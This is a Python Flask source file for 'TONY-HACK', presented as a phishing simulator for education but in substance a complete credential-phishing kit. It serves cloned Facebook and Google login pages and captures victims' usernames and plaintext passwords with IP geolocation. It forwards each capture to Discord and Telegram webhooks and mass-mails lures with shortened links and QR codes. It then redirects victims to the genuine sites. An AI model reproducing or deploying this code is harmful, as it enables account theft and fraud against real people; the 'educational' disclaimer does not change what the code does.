#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TONY-HACK - Phishing Simulator Dashboard
Fampiharana fanofanana sy fanentanana momba ny fiarovana amin'ny phishing
Natao ho an'ny fampianarana ihany - TSY ATAO HO AN'NY ASARATSY
"""

import os
import json
import base64
import hashlib
import secrets
import string
import time
import re
import uuid
import requests
import qrcode
import io
from datetime import datetime, timedelta
from functools import wraps
from urllib.parse import urlparse, quote, unquote
from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_file, make_response
from werkzeug.utils import secure_filename
from PIL import Image, ImageDraw, ImageFont
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'tony-hack-secret-key-2024-change-this')

# Configuration
GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN', '')
GIST_ID = os.environ.get('GIST_ID', '')
BASE_URL = os.environ.get('BASE_URL', 'https://tony-hack.onrender.com')

# Gist helpers
def get_gist_content():
    """Maka ny votoatin'ny Gist"""
    if not GITHUB_TOKEN or not GIST_ID:
        return {}
    try:
        headers = {'Authorization': f'token {GITHUB_TOKEN}'}
        response = requests.get(f'https://api.github.com/gists/{GIST_ID}', headers=headers, timeout=10)
        if response.status_code == 200:
            gist = response.json()
            content = gist.get('files', {}).get('tony-hack-data.json', {}).get('content', '{}')
            return json.loads(content)
    except Exception as e:
        print(f"Error getting gist: {e}")
    return {}

def update_gist_content(data):
    """Manavao ny votoatin'ny Gist"""
    if not GITHUB_TOKEN or not GIST_ID:
        return False
    try:
        headers = {'Authorization': f'token {GITHUB_TOKEN}'}
        payload = {
            'files': {
                'tony-hack-data.json': {
                    'content': json.dumps(data, indent=2, ensure_ascii=False)
                }
            }
        }
        response = requests.patch(f'https://api.github.com/gists/{GIST_ID}', 
                                  headers=headers, json=payload, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"Error updating gist: {e}")
    return False

def load_data():
    """Maka angona avy amin'ny Gist na session"""
    data = get_gist_content()
    if not data:
        # Données par défaut
        data = {
            'users': {
                'admin': {
                    'username': 'admin',
                    'password': hashlib.sha256('admin123'.encode()).hexdigest(),
                    'access_code': 'TONY2026',
                    'avatar': None,
                    'created_at': datetime.now().isoformat(),
                    'login_count': 0,
                    'templates_created': 0
                }
            },
            'templates': [],
            'credentials': [],
            'settings': {
                'smtp': {
                    'server': 'smtp.gmail.com',
                    'port': 587,
                    'email': '',
                    'password': ''
                },
                'webhooks': {
                    'discord': [],
                    'telegram': []
                },
                'security': {
                    'max_attempts': 5,
                    'lockout_duration': 15,
                    'session_timeout': 60,
                    '2fa_enabled': False
                },
                'notifications': {
                    'new_credential': True,
                    'link_click': True,
                    'campaign_finished': True,
                    'sound': True
                },
                'appearance': {
                    'dark_mode': True,
                    'animations': True,
                    'app_name': 'TONY-HACK'
                }
            },
            'campaigns': [],
            'stats': {
                'total_visits': 0,
                'total_clicks': 0,
                'failed_logins': {}
            }
        }
    return data

def save_data(data):
    """Mitahiry angona ao amin'ny Gist"""
    update_gist_content(data)

# Authentication decorator
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user' not in session:
            return redirect(url_for('login'))
        if session.get('expires_at'):
            expires = datetime.fromisoformat(session['expires_at'])
            if datetime.now() > expires:
                session.clear()
                return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# Routes d'authentification
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()
        access_code = request.form.get('access_code', '').strip()
        
        data = load_data()
        users = data.get('users', {})
        
        # Vérification du verrouillage
        stats = data.get('stats', {})
        failed = stats.get('failed_logins', {})
        ip = request.remote_addr
        
        if ip in failed:
            attempts, lock_until = failed[ip]
            if lock_until and datetime.fromisoformat(lock_until) > datetime.now():
                remaining = int((datetime.fromisoformat(lock_until) - datetime.now()).total_seconds() / 60)
                return jsonify({'success': False, 'message': f'Compte verrouillé. Réessayez dans {remaining} minutes.'})
        
        if username in users:
            user = users[username]
            if user['password'] == hashlib.sha256(password.encode()).hexdigest():
                if user.get('access_code', '') == access_code:
                    session['user'] = username
                    session['expires_at'] = (datetime.now() + timedelta(minutes=data['settings']['security']['session_timeout'])).isoformat()
                    
                    # Mise à jour des statistiques
                    user['login_count'] = user.get('login_count', 0) + 1
                    user['last_login'] = datetime.now().isoformat()
                    
                    # Reset des tentatives échouées
                    if ip in failed:
                        del failed[ip]
                    
                    save_data(data)
                    return jsonify({'success': True, 'redirect': url_for('index')})
            
            # Échec de connexion
            if ip not in failed:
                failed[ip] = [1, None]
            else:
                failed[ip][0] += 1
                if failed[ip][0] >= data['settings']['security']['max_attempts']:
                    lock_minutes = data['settings']['security']['lockout_duration']
                    failed[ip][1] = (datetime.now() + timedelta(minutes=lock_minutes)).isoformat()
            
            stats['failed_logins'] = failed
            data['stats'] = stats
            save_data(data)
            
            return jsonify({'success': False, 'message': 'Identifiants incorrects'})
        
        return jsonify({'success': False, 'message': 'Identifiants incorrects'})
    
    return render_template('auth/login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# Routes principales
@app.route('/')
@login_required
def index():
    data = load_data()
    
    active_templates = sum(1 for t in data.get('templates', []) if t.get('active', True))
    total_credentials = len(data.get('credentials', []))
    total_campaigns = len(data.get('campaigns', []))
    
    # Dernières captures
    recent_captures = sorted(data.get('credentials', []), 
                            key=lambda x: x.get('timestamp', ''), reverse=True)[:5]
    
    return render_template('dashboard/index.html',
                         active_templates=active_templates,
                         total_credentials=total_credentials,
                         total_campaigns=total_campaigns,
                         recent_captures=recent_captures)

@app.route('/campaigns')
@login_required
def campaigns():
    data = load_data()
    templates = data.get('templates', [])
    active_templates = [t for t in templates if t.get('active', True)]
    campaigns = data.get('campaigns', [])
    
    return render_template('dashboard/campaigns.html',
                         templates=active_templates,
                         campaigns=campaigns)

@app.route('/templates')
@login_required
def templates():
    data = load_data()
    templates = data.get('templates', [])
    
    # Types disponibles
    types = ['facebook', 'google', 'instagram', 'linkedin', 'twitter', 
             'netflix', 'paypal', 'airtm', 'alibaba', 'payeer', 'custom']
    
    return render_template('dashboard/templates.html',
                         templates=templates,
                         types=types,
                         base_url=BASE_URL)

@app.route('/builder')
@login_required
def builder():
    return render_template('dashboard/builder.html')

@app.route('/logs')
@login_required
def logs():
    data = load_data()
    credentials = data.get('credentials', [])
    templates = {t.get('id'): t.get('name') for t in data.get('templates', [])}
    
    return render_template('dashboard/logs.html',
                         credentials=credentials,
                         templates=templates)

@app.route('/statistics')
@login_required
def statistics():
    data = load_data()
    credentials = data.get('credentials', [])
    
    # Analyse des données
    stats = {
        'total': len(credentials),
        'unique_ips': len(set(c.get('ip', '') for c in credentials)),
        'by_country': {},
        'by_browser': {},
        'by_os': {},
        'by_hour': {},
        'by_template': {}
    }
    
    for cred in credentials:
        # Pays
        country = cred.get('country', 'Inconnu')
        stats['by_country'][country] = stats['by_country'].get(country, 0) + 1
        
        # Template
        template_id = cred.get('template_id', 'inconnu')
        template_name = cred.get('template_name', 'Inconnu')
        if template_id not in stats['by_template']:
            stats['by_template'][template_id] = {'name': template_name, 'count': 0}
        stats['by_template'][template_id]['count'] += 1
        
        # Browser/OS
        ua = cred.get('user_agent', '').lower()
        browsers = ['chrome', 'firefox', 'safari', 'edge', 'opera']
        for browser in browsers:
            if browser in ua:
                stats['by_browser'][browser] = stats['by_browser'].get(browser, 0) + 1
                break
        
        # OS
        if 'windows' in ua:
            stats['by_os']['Windows'] = stats['by_os'].get('Windows', 0) + 1
        elif 'mac' in ua:
            stats['by_os']['macOS'] = stats['by_os'].get('macOS', 0) + 1
        elif 'linux' in ua:
            stats['by_os']['Linux'] = stats['by_os'].get('Linux', 0) + 1
        elif 'android' in ua:
            stats['by_os']['Android'] = stats['by_os'].get('Android', 0) + 1
        elif 'ios' in ua or 'iphone' in ua:
            stats['by_os']['iOS'] = stats['by_os'].get('iOS', 0) + 1
        
        # Heure
        try:
            hour = datetime.fromisoformat(cred.get('timestamp', '')).hour
            stats['by_hour'][hour] = stats['by_hour'].get(hour, 0) + 1
        except:
            pass
    
    return render_template('dashboard/statistics.html', stats=stats)

@app.route('/settings')
@login_required
def settings():
    data = load_data()
    return render_template('dashboard/settings.html', 
                         settings=data.get('settings', {}),
                         smtp=data.get('settings', {}).get('smtp', {}))

@app.route('/profile')
@login_required
def profile():
    data = load_data()
    user = data.get('users', {}).get(session.get('user'), {})
    return render_template('auth/profile.html', user=user)

# API Routes
@app.route('/api/templates', methods=['GET', 'POST', 'PUT', 'DELETE'])
@login_required
def api_templates():
    data = load_data()
    
    if request.method == 'GET':
        return jsonify(data.get('templates', []))
    
    elif request.method == 'POST':
        template_data = request.json
        template_id = str(uuid.uuid4())[:8]
        
        new_template = {
            'id': template_id,
            'name': template_data.get('name', 'Nouveau template'),
            'type': template_data.get('type', 'custom'),
            'color': template_data.get('color', '#e94560'),
            'content': template_data.get('content', ''),
            'active': True,
            'created_at': datetime.now().isoformat(),
            'url': f"{BASE_URL}/t/{template_id}",
            'captures': 0
        }
        
        data['templates'].append(new_template)
        
        # Mise à jour du compteur utilisateur
        user = data['users'].get(session['user'], {})
        user['templates_created'] = user.get('templates_created', 0) + 1
        
        save_data(data)
        return jsonify(new_template)
    
    elif request.method == 'PUT':
        template_id = request.args.get('id')
        updates = request.json
        
        for template in data['templates']:
            if template['id'] == template_id:
                for key, value in updates.items():
                    if key in template:
                        template[key] = value
                save_data(data)
                return jsonify(template)
        
        return jsonify({'error': 'Template non trouvé'}), 404
    
    elif request.method == 'DELETE':
        template_id = request.args.get('id')
        data['templates'] = [t for t in data['templates'] if t['id'] != template_id]
        save_data(data)
        return jsonify({'success': True})

@app.route('/t/<template_id>', methods=['GET', 'POST'])
def serve_template(template_id):
    """Manoa ny template phishing"""
    data = load_data()
    
    template = None
    for t in data.get('templates', []):
        if t['id'] == template_id:
            template = t
            break
    
    if not template or not template.get('active', False):
        return "Template not found", 404
    
    if request.method == 'POST':
        # Capture des credentials
        username = request.form.get('username') or request.form.get('email')
        password = request.form.get('password')
        
        if username and password:
            # Géolocalisation
            ip = request.remote_addr
            geo_info = {'country': 'Inconnu', 'city': 'Inconnu', 'flag': '🌍'}
            
            try:
                response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
                if response.status_code == 200:
                    geo = response.json()
                    if geo.get('status') == 'success':
                        geo_info = {
                            'country': geo.get('country', 'Inconnu'),
                            'city': geo.get('city', 'Inconnu'),
                            'flag': get_flag_emoji(geo.get('countryCode', ''))
                        }
            except:
                pass
            
            credential = {
                'id': str(uuid.uuid4())[:8],
                'template_id': template_id,
                'template_name': template.get('name', 'Inconnu'),
                'username': username,
                'password': password,
                'ip': ip,
                'country': geo_info['country'],
                'city': geo_info['city'],
                'flag': geo_info['flag'],
                'user_agent': request.headers.get('User-Agent', ''),
                'timestamp': datetime.now().isoformat(),
                'target': request.args.get('ref', '')
            }
            
            data['credentials'].append(credential)
            
            # Mise à jour du compteur du template
            for t in data['templates']:
                if t['id'] == template_id:
                    t['captures'] = t.get('captures', 0) + 1
            
            save_data(data)
            
            # Envoyer notifications webhook
            send_webhook_notifications(data, credential)
            
            # Redirection
            redirect_url = get_redirect_url(template.get('type', 'custom'))
            return redirect(redirect_url)
    
    # Rendre le template
    content = template.get('content', '')
    if not content:
        content = get_default_template(template.get('type', 'custom'))
    
    # Remplacer les variables
    target = request.args.get('ref', '')
    if target:
        try:
            target = base64.b64decode(target).decode()
        except:
            pass
    
    content = content.replace('{{target}}', target or '')
    content = content.replace('{{template_id}}', template_id)
    
    return content

@app.route('/api/campaigns', methods=['GET', 'POST'])
@login_required
def api_campaigns():
    data = load_data()
    
    if request.method == 'GET':
        return jsonify(data.get('campaigns', []))
    
    elif request.method == 'POST':
        campaign_data = request.json
        campaign_id = str(uuid.uuid4())[:8]
        
        # Créer le lien de tracking
        template_id = campaign_data.get('template_id')
        target_name = campaign_data.get('target_name', '')
        encoded_target = base64.b64encode(target_name.encode()).decode()
        
        # Raccourcir l'URL
        long_url = f"{BASE_URL}/t/{template_id}?ref={encoded_target}"
        short_url = shorten_url(long_url)
        
        # Générer QR code
        qr_code = generate_qr_code(short_url)
        
        new_campaign = {
            'id': campaign_id,
            'name': campaign_data.get('name', 'Campagne sans nom'),
            'template_id': template_id,
            'targets': campaign_data.get('targets', []),
            'email_template': campaign_data.get('email_template', ''),
            'status': 'draft',
            'created_at': datetime.now().isoformat(),
            'sent_count': 0,
            'success_count': 0,
            'fail_count': 0,
            'tracking_url': short_url,
            'qr_code': qr_code
        }
        
        data['campaigns'].append(new_campaign)
        save_data(data)
        
        return jsonify(new_campaign)

@app.route('/api/send-emails', methods=['POST'])
@login_required
def api_send_emails():
    """Mandefa mailaka amin'ny alalan'ny SMTP"""
    data = load_data()
    smtp_config = data.get('settings', {}).get('smtp', {})
    
    if not smtp_config.get('email') or not smtp_config.get('password'):
        return jsonify({'error': 'Configuration SMTP manque'}), 400
    
    campaign_id = request.json.get('campaign_id')
    targets = request.json.get('targets', [])
    subject = request.json.get('subject', 'Alerte de sécurité')
    email_body = request.json.get('body', '')
    tracking_url = request.json.get('tracking_url', '')
    
    results = {'success': 0, 'failed': 0, 'details': []}
    
    try:
        server = smtplib.SMTP(smtp_config['server'], smtp_config['port'])
        server.starttls()
        server.login(smtp_config['email'], smtp_config['password'])
        
        for target in targets:
            try:
                msg = MIMEMultipart('alternative')
                msg['From'] = smtp_config['email']
                msg['To'] = target['email']
                msg['Subject'] = subject
                
                # Remplacer les variables
                personalized_body = email_body.replace('{{nom}}', target.get('name', ''))
                personalized_body = personalized_body.replace('{{lien}}', tracking_url)
                personalized_body = personalized_body.replace('{{email}}', target['email'])
                
                html_part = MIMEText(personalized_body, 'html')
                msg.attach(html_part)
                
                server.send_message(msg)
                results['success'] += 1
                results['details'].append({'email': target['email'], 'status': 'success'})
            except Exception as e:
                results['failed'] += 1
                results['details'].append({'email': target['email'], 'status': 'failed', 'error': str(e)})
        
        server.quit()
        
        # Mise à jour de la campagne
        for campaign in data.get('campaigns', []):
            if campaign['id'] == campaign_id:
                campaign['status'] = 'sent'
                campaign['sent_count'] = campaign.get('sent_count', 0) + results['success']
                campaign['success_count'] = campaign.get('success_count', 0) + results['success']
                campaign['fail_count'] = campaign.get('fail_count', 0) + results['failed']
                campaign['sent_at'] = datetime.now().isoformat()
        
        save_data(data)
        
    except Exception as e:
        return jsonify({'error': f'Erreur SMTP: {str(e)}'}), 500
    
    return jsonify(results)

@app.route('/api/credentials', methods=['GET', 'DELETE'])
@login_required
def api_credentials():
    data = load_data()
    
    if request.method == 'GET':
        page = int(request.args.get('page', 1))
        per_page = int(request.args.get('per_page', 20))
        search = request.args.get('search', '').lower()
        template_filter = request.args.get('template', '')
        
        credentials = data.get('credentials', [])
        
        # Filtres
        if search:
            credentials = [c for c in credentials if 
                         search in c.get('username', '').lower() or
                         search in c.get('ip', '').lower()]
        
        if template_filter:
            credentials = [c for c in credentials if c.get('template_id') == template_filter]
        
        # Tri
        credentials.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
        
        # Pagination
        total = len(credentials)
        start = (page - 1) * per_page
        end = start + per_page
        
        return jsonify({
            'credentials': credentials[start:end],
            'total': total,
            'page': page,
            'pages': (total + per_page - 1) // per_page
        })
    
    elif request.method == 'DELETE':
        credential_id = request.args.get('id')
        if credential_id:
            data['credentials'] = [c for c in data['credentials'] if c.get('id') != credential_id]
        else:
            # Supprimer tous
            data['credentials'] = []
        save_data(data)
        return jsonify({'success': True})

@app.route('/api/shorten-url', methods=['POST'])
@login_required
def api_shorten_url():
    url = request.json.get('url')
    service = request.json.get('service', 'tinyurl')
    short_url = shorten_url(url, service)
    return jsonify({'short_url': short_url, 'qr_code': generate_qr_code(short_url)})

@app.route('/api/webhook/test', methods=['POST'])
@login_required
def api_test_webhook():
    webhook_type = request.json.get('type')
    webhook_url = request.json.get('url')
    
    test_data = {
        'event': 'test',
        'message': 'Ceci est un test de webhook TONY-HACK',
        'timestamp': datetime.now().isoformat()
    }
    
    try:
        if webhook_type == 'discord':
            payload = {
                'embeds': [{
                    'title': '🔔 Test Webhook TONY-HACK',
                    'description': 'Webhook configuré avec succès !',
                    'color': 15295680,
                    'timestamp': datetime.now().isoformat()
                }]
            }
            response = requests.post(webhook_url, json=payload, timeout=10)
        else:  # telegram
            text = f"🔔 *Test Webhook TONY-HACK*\n\n✅ Webhook configuré avec succès !"
            payload = {'chat_id': webhook_url.split('/')[-1], 'text': text, 'parse_mode': 'Markdown'}
            response = requests.post(f"https://api.telegram.org/bot{webhook_url.split('/')[-2]}/sendMessage", 
                                    json=payload, timeout=10)
        
        if response.status_code in [200, 204]:
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': response.text}), 400
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

# Fonctions utilitaires
def get_flag_emoji(country_code):
    """Convertit un code pays en emoji drapeau"""
    if not country_code:
        return '🌍'
    return ''.join(chr(ord(c) + 127397) for c in country_code.upper())

def shorten_url(long_url, service='tinyurl'):
    """Raccourcit une URL avec différents services"""
    try:
        if service == 'tinyurl':
            response = requests.get(f'https://tinyurl.com/api-create.php?url={quote(long_url)}', timeout=10)
            if response.status_code == 200:
                return response.text
        elif service == 'isgd':
            response = requests.get(f'https://is.gd/create.php?format=simple&url={quote(long_url)}', timeout=10)
            if response.status_code == 200:
                return response.text
    except:
        pass
    return long_url

def generate_qr_code(data):
    """Génère un QR code en base64"""
    try:
        qr = qrcode.QRCode(version=1, box_size=10, border=4)
        qr.add_data(data)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        
        buffered = io.BytesIO()
        img.save(buffered, format="PNG")
        return base64.b64encode(buffered.getvalue()).decode()
    except:
        return None

def get_redirect_url(template_type):
    """Retourne l'URL de redirection selon le type de template"""
    redirects = {
        'facebook': 'https://www.facebook.com/login/',
        'google': 'https://accounts.google.com/',
        'instagram': 'https://www.instagram.com/accounts/login/',
        'linkedin': 'https://www.linkedin.com/login',
        'twitter': 'https://twitter.com/login',
        'netflix': 'https://www.netflix.com/login',
        'paypal': 'https://www.paypal.com/signin',
        'airtm': 'https://app.airtm.com/',
        'alibaba': 'https://login.alibaba.com/',
        'payeer': 'https://payeer.com/'
    }
    return redirects.get(template_type, 'https://www.google.com')

def get_default_template(template_type):
    """Retourne le template HTML par défaut selon le type"""
    templates = {
        'facebook': '''
            <!DOCTYPE html>
            <html>
            <head><title>Facebook - Connexion</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                *{margin:0;padding:0;box-sizing:border-box}
                body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5}
                .container{max-width:400px;margin:50px auto;padding:20px}
                .logo{text-align:center;margin-bottom:20px}
                .logo h1{color:#1877f2;font-size:40px;font-weight:bold}
                .box{background:white;border-radius:8px;padding:20px;box-shadow:0 2px 4px rgba(0,0,0,0.1)}
                input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:6px;font-size:16px}
                button{width:100%;padding:14px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:18px;font-weight:bold;cursor:pointer}
                button:hover{background:#166fe5}
                .footer{text-align:center;margin-top:20px;color:#65676b}
            </style>
            </head>
            <body>
                <div class="container">
                    <div class="logo"><h1>facebook</h1></div>
                    <div class="box">
                        <form method="POST">
                            <input type="text" name="email" placeholder="Adresse e-mail ou téléphone" required>
                            <input type="password" name="password" placeholder="Mot de passe" required>
                            <button type="submit">Se connecter</button>
                        </form>
                    </div>
                    <div class="footer">Facebook © 2024</div>
                </div>
            </body>
            </html>
        ''',
        'google': '''
            <!DOCTYPE html>
            <html>
            <head><title>Google - Connexion</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                *{margin:0;padding:0;box-sizing:border-box}
                body{font-family:'Google Sans',Arial,sans-serif;background:#fff}
                .container{max-width:450px;margin:50px auto;padding:48px 40px}
                .logo{text-align:center;margin-bottom:30px}
                .logo img{width:75px}
                h2{font-size:24px;font-weight:400;margin-bottom:10px}
                .subtitle{color:#5f6368;margin-bottom:30px}
                input{width:100%;padding:14px;margin:10px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px}
                input:focus{outline:none;border-color:#1a73e8}
                button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;margin-top:30px}
                button:hover{background:#1557b0}
            </style>
            </head>
            <body>
                <div class="container">
                    <div class="logo"><img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" style="width:75px"></div>
                    <h2>Connexion</h2>
                    <div class="subtitle">Utiliser votre compte Google</div>
                    <form method="POST">
                        <input type="email" name="email" placeholder="Adresse e-mail" required>
                        <input type="password" name="password" placeholder="Mot de passe" required>
                        <button type="submit">Suivant</button>
                    </form>
                </div>
            </body>
            </html>
        '''
    }
    return templates.get(template_type, templates['facebook'])

def send_webhook_notifications(data, credential):
    """Envoie les notifications webhook"""
    webhooks = data.get('settings', {}).get('webhooks', {})
    
    # Discord webhooks
    for webhook in webhooks.get('discord', []):
        if webhook.get('enabled'):
            try:
                payload = {
                    'embeds': [{
                        'title': '🔑 Nouvelle capture !',
                        'color': 15295680,
                        'fields': [
                            {'name': 'Template', 'value': credential.get('template_name', 'Inconnu'), 'inline': True},
                            {'name': 'Username', 'value': credential.get('username', 'Inconnu'), 'inline': True},
                            {'name': 'Password', 'value': f"||{credential.get('password', 'Inconnu')}||", 'inline': True},
                            {'name': 'IP', 'value': credential.get('ip', 'Inconnu'), 'inline': True},
                            {'name': 'Pays', 'value': f"{credential.get('flag', '🌍')} {credential.get('country', 'Inconnu')}", 'inline': True},
                            {'name': 'Cible', 'value': credential.get('target', 'Inconnue'), 'inline': True}
                        ],
                        'timestamp': datetime.now().isoformat()
                    }]
                }
                requests.post(webhook['url'], json=payload, timeout=5)
            except:
                pass
    
    # Telegram webhooks
    for webhook in webhooks.get('telegram', []):
        if webhook.get('enabled'):
            try:
                text = f"🔑 *Nouvelle capture !*\n\n"
                text += f"📱 Template: `{credential.get('template_name', 'Inconnu')}`\n"
                text += f"👤 Username: `{credential.get('username', 'Inconnu')}`\n"
                text += f"🔐 Password: `{credential.get('password', 'Inconnu')}`\n"
                text += f"🌐 IP: `{credential.get('ip', 'Inconnu')}`\n"
                text += f"📍 Pays: {credential.get('flag', '🌍')} {credential.get('country', 'Inconnu')}\n"
                text += f"🎯 Cible: `{credential.get('target', 'Inconnue')}`"
                
                bot_token = webhook['url'].split('/')[-2]
                chat_id = webhook['url'].split('/')[-1]
                payload = {'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'}
                requests.post(f'https://api.telegram.org/bot{bot_token}/sendMessage', json=payload, timeout=5)
            except:
                pass

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
